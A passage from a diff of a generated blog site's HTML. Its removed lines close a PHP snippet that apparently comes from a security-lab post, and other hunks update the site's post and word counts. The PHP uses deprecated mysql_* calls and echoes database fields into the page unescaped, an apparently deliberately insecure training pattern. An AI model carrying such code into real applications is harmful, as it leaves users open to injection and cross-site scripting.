$i=0;</span><br><span class="line"></span><br><span class="line">        while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">            $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">            </span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3756,7 +3714,7 @@ md5sum common-password.txt password.txt</code></pre></blockquote>
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">134</span>
+                  <span class="site-state-item-count">135</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3863,7 +3821,7 @@ md5sum common-password.txt password.txt</code></pre></blockquote>
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">119.3k</span>
+    <span title="Site words total count">120.3k</span>
   
 </div>
 
